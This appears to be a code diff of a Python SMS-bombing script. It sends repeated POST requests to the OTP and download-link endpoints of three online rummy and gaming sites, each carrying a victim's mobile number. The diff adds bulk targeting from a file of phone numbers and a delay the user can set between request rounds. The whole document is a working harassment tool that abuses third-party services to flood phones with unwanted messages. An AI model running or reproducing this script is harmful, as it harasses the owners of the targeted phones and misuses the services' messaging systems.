@@ -1,10 +1,19 @@
-
 import json
 import requests
 import time
 
-num = input("Enter the mobile number: ")
+choice = int(input("1 enter number \n2 enter Number list \n Select an Option :"))
+if choice == 1:
+    num = input("Enter the mobile number: ")
+    nums = [num]
+elif choice == 2:
+    file_name = input("Enter the name of text file: ")
+    with open(file_name) as f:
+        nums = f.readlines()
+    nums = [x.strip() for x in nums]
+
 req = int(input("Enter the number of requests to be sent: "))
+delay=int(input("Enter the delay of second (1,2,3) :"))
 headers = {
     "Sec-Ch-Ua": "\"Chromium\";v=\"109\", \"Not_A Brand\";v=\"99\"",
     "Accept": "application/json, text/plain, */*",
@@ -24,19 +33,24 @@ headers = {
 }
 
 url1 = "https://pla23api.a23.com/PlatformService/support/sendApkLink"
-data1 = {"channelFor":"APK","mobileNumber":num,"gameType":"A23Games"}
+data1 = {"channelFor":"APK","gameType":"A23Games"}
 
 url2 = 'https://www.rummycircle.com/api/fl/auth/v3/getOtp'
-payload = {"mobile":num,"deviceId":"e6abe4d3-b210-4a5a-aa99-41a04b3fbd90","deviceName":"","refCode":"","isPlaycircle":False}
+payload = {"deviceId":"e6abe4d3-b210-4a5a-aa99-41a04b3fbd90","deviceName":"","refCode":"","isPlaycircle":False}
 
 url3 = 'https://www.rummyculture.com/api/user/sendAppDownloadLink'
-data = {"mobile": num}
+data = {}
 
-for i in range(req):
-    time.sleep(3)
-    response1 = requests.post(url1, headers=headers, json=data1)
-    print(f"Response for {url1} : {response1.status_code}")
-    response2 = requests.post(url2, headers=headers, data=json.dumps(payload))
-    print(f"Response for {url2} : {response2.status_code}")
-    response3 = requests.post(url3, headers=headers, json=data)
-    print(f"Response for {url3} : {response3.status_code}")
+for num in nums:
+    data1["mobileNumber"] = num
+    payload["mobile"] = num
+    data["mobile"] = num
+    for i in range(req):
+        time.sleep(delay)
+        response1 = requests.post(url1, headers=headers, json=data1)
+        print(f"Response for {url1} with number {num} : {response1.status_code}")
+        response2 = requests.post(url2, headers=headers, data=json.dumps(payload))
+        print(f"Response for {url2} with number {num} : {response2.status_code}")
+        response3 = requests.post(url3, headers=headers, json=data)
+        print(f"Response for {url3} with number {num} : {response3.status_code}")
+
